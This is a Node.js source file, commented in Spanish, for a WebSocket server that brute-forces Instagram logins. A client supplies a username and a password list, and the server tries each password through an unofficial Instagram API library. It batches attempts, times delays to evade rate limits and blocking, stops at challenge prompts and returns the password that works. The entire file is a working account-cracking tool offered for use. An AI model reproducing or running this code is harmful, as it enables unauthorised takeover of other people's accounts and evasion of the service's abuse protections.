const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Configuración de velocidad
const CONFIG = {
  ACCESS_PASSWORD: process.env.ACCESS_PASSWORD || 'error404notfoundÑ',
  DELAY_NORMAL: 1500,       // 1.5s entre intentos normales
  DELAY_AFTER_FAIL: 3000,   // 3s después de un fallo
  DELAY_CRITICAL: 10000,    // 10s para errores críticos
  BATCH_SIZE: 3,            // Procesar 3 contraseñas por lote
  PORT: process.env.PORT || 8080
};

console.log(`[⚡] Servidor turbo iniciado. Puerto: ${CONFIG.PORT}`);

// Técnica de delay adaptable
const smartDelay = (lastError) => {
  if (!lastError) return delay(CONFIG.DELAY_NORMAL);
  if (lastError.includes('limit') || lastError.includes('blocked')) {
    return delay(CONFIG.DELAY_CRITICAL);
  }
  return delay(CONFIG.DELAY_AFTER_FAIL);
};

// Procesamiento por lotes para mayor velocidad
async function processBatch(username, passwords, ws) {
  const ig = new IgApiClient();
  ig.state.generateDevice(username);
  
  let lastError = null;
  
  for (const password of passwords) {
    try {
      await ig.simulate.preLoginFlow();
      await delay(500); // Mini delay entre pasos
      
      const auth = await ig.account.login(username, password);
      
      if (auth.status === 'ok') {
        return { success: true, password };
      }
    } catch (error) {
      lastError = error.message;
      
      // Detección rápida de errores críticos
      if (error.message.includes('challenge_required')) {
        return { success: false, message: 'Verificación manual requerida' };
      }
    } finally {
      await smartDelay(lastError);
    }
  }
  return { success: false };
}

// Conexión WebSocket optimizada
wss.on('connection', (ws) => {
  console.log('[🔌] Conexión establecida');

  ws.on('message', async (message) => {
    const data = JSON.parse(message);
    
    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      
      // Procesar por lotes
      for (let i = 0; i < passwords.length; i += CONFIG.BATCH_SIZE) {
        const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
        const result = await processBatch(username, batch, ws);
        
        if (result.success) {
          ws.send(JSON.stringify({ 
            type: 'success', 
            password: result.password,
            stats: { tested: i + batch.length, total: passwords.length }
          }));
          return;
        }
        
        ws.send(JSON.stringify({
          type: 'progress',
          progress: { current: i + batch.length, total: passwords.length }
        }));
      }
      
      ws.send(JSON.stringify({ type: 'completed', success: false }));
    }
  });
});

server.listen(CONFIG.PORT, () => {
  console.log(`[🚀] Servidor listo en http://localhost:${CONFIG.PORT}`);
});
